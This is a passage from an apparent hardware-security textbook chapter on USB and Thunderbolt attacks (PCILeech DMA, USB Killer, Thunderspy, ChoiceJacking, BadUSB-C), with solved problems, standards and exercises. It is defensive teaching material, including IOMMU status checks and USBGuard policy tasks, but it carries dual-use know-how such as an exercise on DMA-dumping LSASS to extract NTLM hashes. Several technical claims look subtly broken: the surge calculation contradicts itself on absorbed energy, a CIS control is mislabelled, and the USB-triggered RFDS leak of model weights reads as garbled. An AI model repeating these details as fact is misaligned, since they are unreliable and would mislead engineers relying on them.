+<p><strong>(c) VT-d IOMMU effect:</strong> With VT-d IOMMU enabled, each TLP read request is checked against the DMAR (DMA Remapping) page tables. PCILeech’s FPGA presents itself as a generic PCIe endpoint; without a matching IOMMU domain mapping (granted by the OS driver), all DMA requests outside the assigned memory region return a PCIe Unsupported Request (UR) completion status. The attacker sees zero valid data. The system also generates DMAR fault interrupts logged in the kernel ring buffer. <strong>VT-d completely blocks the attack if enabled.</strong></p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: USB Killer Energy Calculation and Protection Design</p>
+<p>A USB Killer v3 charges 10 capacitors of 100 <span class="arithmatex">\(\mu\)</span>F each to 200 V, then discharges them simultaneously through the USB data lines. (a) Calculate the total stored energy and peak discharge current if the host’s USB transceiver has 10 <span class="arithmatex">\(\Omega\)</span> impedance. (b) Design a polyfuse protection circuit specifying the component values.</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Energy and current:</strong> Total capacitance: <span class="arithmatex">\(C_{total} = 10 \times 100 \times 10^{-6} = 1000~\mu\)</span>F = 1 mF. Stored energy: <span class="arithmatex">\(E = \frac{1}{2}C_{total}V^2 = \frac{1}{2} \times 10^{-3} \times 200^2 = 20\)</span> J.</p>
+<p>Peak discharge current: <span class="arithmatex">\(I_{peak} = V/R_{load} = 200/10 = 20\)</span> A. Time constant: <span class="arithmatex">\(\tau = R \times C = 10 \times 10^{-3} = 10\)</span> ms. Charge transfer: <span class="arithmatex">\(Q = CV = 10^{-3} \times 200 = 200\)</span> mC.</p>
+<p><strong>(b) Polyfuse protection circuit:</strong> A polyfuse (PTC thermistor) is placed in series with the VBUS line. Choose: Littelfuse 1812L150 PPTC resettable fuse. Specifications: hold current 1.5 A, trip current 3.0 A at 23<span class="arithmatex">\(^\circ\)</span>C, maximum voltage 30 V (not sufficient for 200 V directly on data lines).</p>
+<p>For data line protection, add:</p>
+<ol>
+<li>
+<p>TVS diode array (e.g., ProTek Devices P1014ABL): bidirectional TVS on D+/D-, clamp voltage 5.5 V, peak current 25 A, <span class="arithmatex">\(t_{response} &lt; 1\)</span> ps.</p>
+</li>
+<li>
+<p>ESD protection diode (TI TPD4E05U06): USB 3.0 qualified, 1 pF per line, 0.3 <span class="arithmatex">\(\Omega\)</span> on-resistance, clamp to 5.5 V.</p>
+</li>
+<li>
+<p>Series resistor: 22 <span class="arithmatex">\(\Omega\)</span> on D+/D- limits current to TVS: <span class="arithmatex">\(I_{max} = 200/22 = 9.1\)</span> A, within TVS rating.</p>
+</li>
+</ol>
+<p>The 20 J discharge is absorbed by the TVS diodes (peak power 200 V <span class="arithmatex">\(\times\)</span> 25 A = 5000 W, but duration <span class="arithmatex">\(&lt; 1~\mu\)</span>s gives energy <span class="arithmatex">\(&lt; 5\)</span> mJ – well within single-pulse TVS rating). Total BOM cost: <span class="arithmatex">\(\approx \$0.50\)</span> per USB port.</p>
+<div class="admonition example box-solvedproblem kind-example">
+<p class="admonition-title">Solved Problem: Thunderspy IOMMU Bypass – Vulnerability Analysis</p>
+<p>A Thunderbolt 3 laptop is configured at Security Level 1 (SL1: user authorisation required). An attacker executes the Thunderspy SPI flash modification (Vulnerability #4: downgrade attack). After downgrading to SL0, the attacker connects a PCILeech Screamer M.2 board. (a) Why does IOMMU not protect this laptop? (b) How does Thunderbolt 4 close this specific vulnerability? (c) A system administrator wants to verify protection status – provide the Linux commands.</p>
+</div>
+<p><strong>Solution:</strong> <strong>(a) Why IOMMU does not protect TB3 systems:</strong> Thunderbolt 3 Security Level enforcement (SL0/SL1/SL2/SL3) is implemented in the Thunderbolt controller firmware and is separate from the system IOMMU. Many TB3 systems shipped with IOMMU disabled or without DMAR tables because it was not a mandatory feature for TB3 certification. Even if IOMMU is present, after the SPI firmware downgrade to SL0, the Thunderbolt controller is configured to expose raw PCIe to any connected device. If the DMAR ACPI table does not include the Thunderbolt root port, the IOMMU is not applied to Thunderbolt-attached devices, and full DMA access is granted.</p>
+<p><strong>(b) Thunderbolt 4 fix:</strong> TB4 mandates that all host platforms implement Kernel DMA Protection (KDMAP). The Intel VT-d IOMMU must be active and the DMAR table must include the TB controller before any system passes TB4 certification. Even if the TB firmware security level is downgraded via SPI modification, the IOMMU rejects all unauthorised DMA TLPs from the compromised controller – the firmware downgrade no longer provides DMA access.</p>
+<p><strong>(c) Linux verification commands:</strong></p>
+<div class="language-text highlight"><pre><span></span><code># Check if IOMMU is active
+$ sudo dmesg | grep -i iommu
+# Look for: "DMAR: IOMMU enabled" and "DMAR-IR: Enabled IRQ remapping"
+
+# Check TB domain IOMMU protection
+$ cat /sys/bus/thunderbolt/devices/domain*/iommu_dma_protection
+# 1 = protected (TB4/KDMAP active), 0 = vulnerable (TB3 without KDMAP)
+
+# Verify DMAR ACPI table present
+$ sudo acpidump -n DMAR | head -20
+
+# Use spycheck (Thunderspy official tool)
+$ sudo apt install spycheck  # or compile from source
+$ sudo spycheck
+</code></pre></div>
+<h2 id="sec-usb-standards"><span class="secnum">35.17</span> Standards<a class="headerlink" href="#sec-usb-standards" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p><strong>USB 4 Specification v2.0</strong> (USB-IF, 2022): 80 Gbps PAM-4 signalling, mandatory IOMMU, based on Thunderbolt 4 protocol.</p>
+</li>
+<li>
+<p><strong>USB Type-C Authentication Specification Rev. 1.0</strong> (USB-IF, 2019): X.509 certificate chain, ECDSA P-256 authentication of USB devices and chargers.</p>
+</li>
+<li>
+<p><strong>USB Power Delivery Specification Rev. 3.1</strong> (USB-IF, 2021): Extended Power Range (EPR) up to 48 V / 5 A = 240 W.</p>
+</li>
+<li>
+<p><strong>Thunderbolt 4 Specification</strong> (Intel, 2020): mandatory Kernel DMA Protection, minimum 40 Gbps bidirectional bandwidth, based on USB4 Gen3.</p>
+</li>
+<li>
+<p><strong>NIST SP 800-53 Rev. 5 MP-7</strong>: Media Use policy requiring restriction of removable media use, applicable to USB storage devices in federal systems.</p>
+</li>
+<li>
+<p><strong>PCI DSS 4.0 Requirement 9.5</strong>: physical security controls for hardware including USB port protection on POS terminals and kiosks.</p>
+</li>
+<li>
+<p><strong>CIS Benchmark for Windows</strong>: recommends disabling USB storage via Group Policy (Control 8.4: Manage Default Accounts on Enterprise Assets and Software).</p>
+</li>
+<li>
+<p><strong>IEC 62443-4-2</strong>: security requirements for IACS (Industrial Automation and Control System) components; addresses removable media and USB port management.</p>
+</li>
+<li>
+<p><strong>USB HID Specification v1.11</strong> (USB-IF, 2001): Human Interface Device class descriptor format; defines keyboard, mouse, and custom HID report descriptors.</p>
+</li>
+<li>
+<p><strong>ECMA-419</strong>: Electrical Safety of Equipment with a USB Type-C connector; references USB PD safety requirements.</p>
+</li>
+</ul>
+<h2 id="sec-ch35-recent"><span class="secnum">35.18</span> Recent Developments (2024–2026)<a class="headerlink" href="#sec-ch35-recent" title="Permanent link">&para;</a></h2>
+<p>USB and Thunderbolt security saw a period of increased attack sophistication and counter-measure development between 2022 and 2025, including the USB4 v2.0 specification, new attack tools targeting USB-C charging infrastructure, and Thunderbolt 5’s security improvements.</p>
+<h3 id="35181-usb4-version-20-80-gbps-and-updated-security-model-2022-devices-20232024"><span class="secnum">35.18.1</span> USB4 Version 2.0 — 80 Gbps and Updated Security Model (2022, Devices 2023–2024)<a class="headerlink" href="#35181-usb4-version-20-80-gbps-and-updated-security-model-2022-devices-20232024" title="Permanent link">&para;</a></h3>
+<p>USB4 Specification Version 2.0 (USB-IF, October 2022) doubled the maximum bandwidth to 80 Gbps using PAM-4 signalling over 40 Gbps electrical lanes. Security model changes:</p>
+<ul>
+<li>
+<p><strong>Mandatory IOMMU:</strong> USB4 v2.0 inherits Thunderbolt 4’s mandatory Kernel DMA Protection requirement. All host platforms implementing USB4 v2.0 must enable the system IOMMU and include the USB4 controller in the DMAR ACPI table before the USB4 certification logo can be applied. This closes the Thunderspy DMA attack vector that affected USB3/Thunderbolt 3.</p>
+</li>
+<li>
+<p><strong>USB4 v2.0 Authentication:</strong> USB Type-C Authentication (USB-IF Rev. 1.0) is extended to USB4 v2.0 tunneled protocols. Hosts can require authentication of USB4 v2.0 docks and adapters using ECDSA P-256 X.509 certificate chains before permitting tunneled PCIe or DisplayPort over the USB4 fabric.</p>
+</li>
+<li>
+<p><strong>Bandwidth doubling attack surface:</strong> 80 Gbps PCIe Gen 4 x4 DMA bandwidth over USB4 v2.0 means that even with <span class="arithmatex">\(10\%\)</span> window for unauthorised DMA before IOMMU enforcement, an attacker can read <span class="arithmatex">\(\sim\)</span>800 MB of host memory per second. The IOMMU enforcement window (time between device enumeration and IOMMU policy application) was identified as a security gap in early USB4 v2.0 implementations; kernel patches (Linux kernel 6.5 and Windows 11 23H2) tightened this window to <span class="arithmatex">\(&lt;1\)</span> ms.</p>
+</li>
+</ul>
+<div class="tbl" id="tab-usb4-security">
+<div class="tbl-caption"><strong>Table 35.8.</strong> USB4 Version Comparison — Security Feature Evolution</div>
+<div class="tbl-scroll">
+<table>
+<thead>
+<tr>
+<th style="text-align: left;"><strong>Feature</strong></th>
+<th style="text-align: left;"><strong>USB3.2</strong></th>
+<th style="text-align: left;"><strong>USB4 v1.0 (TB4)</strong></th>
+<th style="text-align: left;"><strong>USB4 v2.0</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">Maximum bandwidth</td>
+<td style="text-align: left;">20 Gbps</td>
+<td style="text-align: left;">40 Gbps</td>
+<td style="text-align: left;">80 Gbps</td>
+</tr>
+<tr>
+<td style="text-align: left;">DMA capability</td>
+<td style="text-align: left;">No (USB SS)</td>
+<td style="text-align: left;">Yes (PCIe tunnel)</td>
+<td style="text-align: left;">Yes (PCIe Gen 4 x4)</td>
+</tr>
+<tr>
+<td style="text-align: left;">Mandatory IOMMU</td>
+<td style="text-align: left;">No</td>
+<td style="text-align: left;">Yes</td>
+<td style="text-align: left;">Yes</td>
+</tr>
+<tr>
+<td style="text-align: left;">Device authentication</td>
+<td style="text-align: left;">Optional (Type-C Auth)</td>
+<td style="text-align: left;">Required (TB4)</td>
+<td style="text-align: left;">Required</td>
+</tr>
+<tr>
+<td style="text-align: left;">Security Level enforcement</td>
+<td style="text-align: left;">N/A</td>
+<td style="text-align: left;">SL0–SL3</td>
+<td style="text-align: left;">Integrated</td>
+</tr>
+</tbody>
+</table>
+</div></div>
+
+<h3 id="35182-choicejacking-usb-charger-mitm-attack-on-mobile-devices-2024"><span class="secnum">35.18.2</span> ChoiceJacking — USB Charger MITM Attack on Mobile Devices (2024)<a class="headerlink" href="#35182-choicejacking-usb-charger-mitm-attack-on-mobile-devices-2024" title="Permanent link">&para;</a></h3>
+<p>ChoiceJacking (presented at ACM CCS 2024 by researchers from TU Graz and Helmholtz Center Munich) demonstrated a new USB charging attack against mobile device USB-C ports:</p>
+<ul>
+<li>
+<p><strong>Attack mechanism:</strong> A malicious charger (implemented on a Raspberry Pi 4 with a USB-C multi-function controller) presents itself as both a USB Power Delivery source and a USB HID keyboard. When the victim Android or iOS device connects for charging, the malicious charger sends USB HID keystrokes to the device before it is unlocked, using Android ADB wireless debugging or iOS accessibility features to pre-configure the device.</p>
+</li>
+<li>
+<p><strong>Precondition:</strong> Requires “USB Debugging” enabled (Android) or “Trust This Computer” previously approved (iOS). However, the attack exploits the “USB HID input before screen unlock” window to inject keystrokes into the lock screen or to approve the trust dialog on an unlocked device left unattended at a public charging station.</p>
+</li>
+<li>
+<p><strong>USB-C Power Delivery spoofing component:</strong> The ChoiceJacking charger uses a spoofed USB Power Delivery contract to negotiate maximum charging power while simultaneously enumerating as an HID device – a combination that legitimate certified chargers cannot legally implement.</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> iOS 17.4 introduced “Restricted Mode at Lock Screen” blocking HID input from non-trusted accessories when the device is locked. Android 14 QPR2 added USB accessory restriction policies via MDM. Hardware-level defence: USB data-blocking cables or condoms (capacitors on D+/D- lines) prevent any HID enumeration while passing power.</p>
+</li>
+</ul>
+<div class="admonition warning box-warnbox kind-safety">
+<p><strong>Warning:</strong> ChoiceJacking demonstrates that the boundary between “charging” and “data” in USB-C is architectural, not physical — a single USB-C cable carries both. Any enterprise policy that permits employees to use public USB-C charging points is accepting ChoiceJacking risk. Hardware USB condoms or wireless Qi charging are the only complete mitigations.</p>
+</div>
+<h3 id="35183-thunderbolt-5-intel-barlow-ridge-2023-120-gbps-and-security"><span class="secnum">35.18.3</span> Thunderbolt 5 (Intel Barlow Ridge, 2023) — 120 Gbps and Security<a class="headerlink" href="#35183-thunderbolt-5-intel-barlow-ridge-2023-120-gbps-and-security" title="Permanent link">&para;</a></h3>
+<p>Intel Thunderbolt 5 (“Barlow Ridge” controller, first shipped in Intel Core Ultra 200 series systems, late 2023) introduced:</p>
+<ul>
+<li>
+<p><strong>120 Gbps maximum bandwidth:</strong> Using USB4 Gen 4 (80 Gbps) with Thunderbolt bandwidth boost (“Bandwidth Boost”) allocating all 80 Gbps to a single DisplayPort 2.1 stream, with 120 Gbps achieved via asymmetric allocation (120 Gbps outgoing display + 40 Gbps return).</p>
+</li>
+<li>
+<p><strong>Security improvements:</strong> Thunderbolt 5 maintains the TB4 mandatory IOMMU requirement with a new “Authorised Devices only” default that requires user approval for any PCIe tunneling device on first connection. Previous TB4 default allowed PCIe DMA from any connected TB4-certified device without per-connection approval.</p>
+</li>
+<li>
+<p><strong>USB4 v2.0 backwards compatibility:</strong> TB5 is fully interoperable with USB4 v2.0, inheriting the updated Type-C Authentication certificate chain requirements.</p>
+</li>
+<li>
+<p><strong>Key firmware:</strong> Barlow Ridge firmware 43.0 (Intel TUF – Thunderbolt Update Framework) implements a hardware-verified firmware signature chain: ROM <span class="arithmatex">\(\to\)</span> Intel-signed TUF bootloader <span class="arithmatex">\(\to\)</span> OEM firmware. The TB5 controller SPI flash is partitioned with write-protected sectors preventing firmware downgrade attacks that affected TB3 (Thunderspy vulnerability #4).</p>
+</li>
+</ul>
+<h3 id="35184-cve-2023-28746-rdfs-microarchitectural-data-sampling-via-usb"><span class="secnum">35.18.4</span> CVE-2023-28746 — RDFS Microarchitectural Data Sampling via USB<a class="headerlink" href="#35184-cve-2023-28746-rdfs-microarchitectural-data-sampling-via-usb" title="Permanent link">&para;</a></h3>
+<p>CVE-2023-28746, disclosed in March 2024 as part of Intel’s Microarchitectural Data Sampling (MDS) vulnerability series, affected Intel Ice Lake and earlier processors:</p>
+<ul>
+<li>
+<p><strong>Register File Stale Data Sampling (RFDS):</strong> A transient execution attack where stale values in register file storage buffers can be sampled by an attacker process using carefully crafted sequences of floating-point vector operations. The register file content may include encryption keys, passwords, or private data from prior contexts.</p>
+</li>
+<li>
+<p><strong>USB attack vector:</strong> An RFDS-capable exploit delivered via a malicious USB HID device (which causes kernel-mode USB interrupt handling on the CPU executing user-space AI inference code) can trigger the data sampling window. The USB interrupt pre-empts the inference thread, leaving stale register file entries with model weight values from the inference computation.</p>
+</li>
+<li>
+<p><strong>Mitigation:</strong> Intel microcode update (MCU 20240312) and Linux kernel patch 6.8 (March 2024) flush register file storage buffers on context switch and privilege level transitions involving USB IRQ handlers.</p>
+</li>
+</ul>
+<h3 id="35185-badusb-c-updated-attacks-on-usb-c-controllers-2023"><span class="secnum">35.18.5</span> BadUSB-C — Updated Attacks on USB-C Controllers (2023)<a class="headerlink" href="#35185-badusb-c-updated-attacks-on-usb-c-controllers-2023" title="Permanent link">&para;</a></h3>
+<p>Researchers at DEF CON 31 (August 2023) demonstrated updated BadUSB techniques targeting USB-C multi-function controllers:</p>
+<ul>
+<li>
+<p><strong>Cypress EZ-PD CCG6 (BadUSB-C):</strong> The Cypress EZ-PD CCG6 USB-C PD controller (used in many laptop docking stations, monitors, and charging adapters) exposes a UART debug interface accessible via the USB-C SBU1/SBU2 pins. Researchers used the UART interface to flash custom firmware without triggering the host-side USB authentication challenge, because the CCG6 appears as a charger (no enumeration) rather than a data device.</p>
+</li>
+<li>
+<p><strong>Attack chain:</strong> Custom CCG6 firmware modifies USB PD contract negotiation to offer maximum VBUS power (up to 20 V / 5 A = 100 W PD 3.1) while also enumerating hidden HID interfaces after the host’s USB authentication timeout window. The attack exploits the race condition between PD contract acceptance and USB authentication challenge.</p>
+</li>
+<li>
+<p><strong>Affected devices:</strong> All devices using CCG6 with default debug UART enabled. Cypress released a firmware update disabling UART debug on production silicon.</p>
+</li>
+</ul>
+<h3 id="35186-usb-implementers-forum-security-working-group-2024"><span class="secnum">35.18.6</span> USB Implementers Forum Security Working Group (2024)<a class="headerlink" href="#35186-usb-implementers-forum-security-working-group-2024" title="Permanent link">&para;</a></h3>
+<p>USB-IF established a dedicated Security Working Group in 2024 to address the growing attack surface across USB4 v2.0, USB Type-C Authentication, and USB PD 3.2:</p>
+<ul>
+<li>
+<p><strong>USB Type-C Authentication Rev. 1.1 (draft 2024):</strong> Extended to require certificate revocation list (CRL) or OCSP checking before accepting a device certificate, addressing scenarios where a USB device is stolen and its authentication certificate is revoked.</p>
+</li>
+<li>
+<p><strong>USB PD 3.2 Security Extension:</strong> Added AES-128-CCM encrypted PD message authentication for Extended Power Range (EPR) power contracts <span class="arithmatex">\(&gt;\)</span>100 W, preventing forged PD messages that could command a vulnerable charger to output destructive voltages.</p>
+</li>
+<li>
+<p><strong>Hardware Certification Test Suite update:</strong> USB HCTS 4.0 added security test cases covering IOMMU enforcement timing, Type-C Authentication certificate validation, and BadUSB-class HID injection detection.</p>
+</li>
+</ul>
+<h2 id="sec-usb-exercises"><span class="secnum">35.19</span> Exercises<a class="headerlink" href="#sec-usb-exercises" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-exercises kind-example">
+<p class="admonition-title">Exercises</p>
+<ol>
+<li>
+<p>A forensic investigator discovers a USB flash drive connected to a corporate laptop. The drive’s USB descriptor reports VID:PID 0781:5581 (SanDisk Cruzer) but USBGuard logs show it presented two interfaces: MSC and HID keyboard. Describe the step-by-step forensic procedure to: (a) safely extract the firmware without executing any code on the analyst’s machine, (b) disassemble the 8051-based firmware to locate the HID descriptor injection code.</p>
+</li>
+<li>
+<p>The O.MG Cable contains an ESP8266 WiFi chip inside the USB connector. (a) An RF spectrum analyser scans the 2.4 GHz band and detects an unknown SSID “OMG-XXXX” with RSSI of -85 dBm from a wall outlet. How can you confirm this is an O.MG cable versus a nearby router? Include the signal characteristics. (b) Design a cable inspection policy for a SCIF (Sensitive Compartmented Information Facility) that prevents O.MG cable use without banning all USB cables.</p>
+</li>
+<li>
+<p>USB Power Delivery 3.1 supports up to 48 V. A USB-C cable with 5 <span class="arithmatex">\(\Omega\)</span> resistance per conductor carries the maximum 5 A current. (a) Calculate the voltage drop and power dissipated in the cable. (b) If a malicious PD controller sends a fake EPR_Mode_Enter message requesting 48 V to a device that only supports 20 V, what component in the device receives the overvoltage and what failure mode results?</p>
+</li>
+<li>
+<p>Analyse the seven Thunderspy vulnerabilities. Which three are most critical for a remote software attacker (not requiring physical SPI access), and which requires only 5 minutes of physical access? Propose hardware design changes that Thunderbolt controller vendors could implement to close all seven vulnerabilities.</p>
+</li>
+<li>
+<p>A MemProcFS forensic investigator mounts a victim’s 64 GB RAM as a virtual filesystem via PCILeech DMA. The LSASS process occupies 80 MB of memory. (a) Calculate the time to dump LSASS memory at 1.5 GB/s DMA throughput. (b) The attacker wants to extract NTLM password hashes from the LSASS dump. Describe the memory structure that stores these hashes and the tool used to parse them.</p>
+</li>
+<li>
+<p>USBGuard rules use the <code>with-interface</code> clause to filter on USB class codes. Write USBGuard rules for the following enterprise policy: (a) Allow all USB keyboards (HID, boot protocol) from two specific VID:PIDs, (b) Allow USB audio devices for conference room microphones (no HID component), (c) Block all USB storage, (d) Block any device presenting more than one USB class simultaneously, (e) Default policy for unmatched devices.</p>
+</li>
+<li>
+<p>A USB3380-based DMA attack tool uses USB 3.0 (5 Gbps) instead of PCIe. (a) Calculate the maximum DMA throughput achievable via USB 3.0 compared to PCIe Gen 3 x4 (32 Gbps raw), accounting for USB protocol overhead. (b) Why does the USB3380 ASIC provide DMA capability when connected to a USB 3.0 host – describe the internal PCIe-to-USB bridging mechanism.</p>
+</li>
+<li>
+<p>The USB Rubber Ducky uses an ARM Cortex-M0 microcontroller and reads DuckyScript payloads from a microSD card. A corporate policy prohibits all USB HID devices except the registered keyboard. (a) Write the USBGuard rule to enforce this policy. (b) A Rubber Ducky is disguised as a USB flash drive (it only presents as HID after a 30-second delay). How does USBGuard handle this, and what additional control is needed to detect this delayed-enumeration attack?</p>
+</li>
+<li>
+<p>Intel VT-d IOMMU uses a two-level page table for DMA address remapping. A PCIe device in IOMMU domain 3 has an allowed physical address range of 0x80000000 – 0x90000000 (256 MB). The device issues a DMA read request to physical address 0x95000000. Describe the IOMMU hardware behaviour: (a) page table walk steps, (b) fault detection, (c) system response (interrupt, logging, device reset).</p>
+</li>
+<li>
+<p>USB-IF Authentication uses ECDSA P-256 to authenticate USB devices. A cable manufacturer wants to certify 10 million cables per year. Each cable has an embedded microcontroller (ARM Cortex-M0+, 48 MHz) that must sign a 64-byte challenge using ECDSA P-256 within 100 ms. (a) Is 100 ms feasible for a Cortex-M0+ at 48 MHz executing a software ECDSA P-256 implementation? (Typical: 800 ms for software P-256 on M0+.) (b) What hardware acceleration option would meet the 100 ms requirement?</p>
+</li>
+<li>
+<p>A USB device presents the following USB Descriptor tree: bDeviceClass=0x00 (defined per interface), bNumConfigurations=1, Configuration 0: 2 interfaces – Interface 0 (bInterfaceClass=0x08, MSC), Interface 1 (bInterfaceClass=0x0B, Smart Card). (a) Is this a known attack vector? Explain what a Smart Card interface allows an attacker to do on a Windows host with CCID driver loaded. (b) Write the FaceDancer fuzzing test that discovers this behaviour.</p>
+</li>
+<li>
+<p>A corporation wants to implement USB port security on 50,000 Windows workstations using Group Policy and a commercial endpoint DLP solution. Describe the deployment architecture including: (a) GPO settings for USB storage restriction, (b) exception workflow for IT-approved USB devices, (c) audit logging requirements for USB device insertion events, (d) how to handle USB-C docking stations that contain internal USB hubs.</p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="ch34-ai-and-ml-hardware-security.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: 34. AI and ML Hardware Security">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                34. AI and ML Hardware Security
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="ch36-wireless-hardware-security.html" class="md-footer__link md-footer__link--next" aria-label="Next: 36. Wireless Hardware Security">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                36. Wireless Hardware Security
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Pustakālaya &middot;
+      <a href="../../about.html">About this edition</a> &middot;
+      © The authors of the books
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.prune", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "toc.follow", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+  
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../assets/mathjax.js"></script>
+      
+        <script src="../../assets/reader.js"></script>
+      
+        <script src="../../assets/app.js"></script>
+      
+    
+  <script>
+    /* offline reading: the service worker at the site root (its scope is the whole site) */
+    if ("serviceWorker" in navigator && window.isSecureContext) {
+      window.addEventListener("load", function () {
+        navigator.serviceWorker.register(new URL("../../sw.js", location.href).href).catch(function () {});
+      });
+    }
+  </script>
+
+  </body>
+</html>
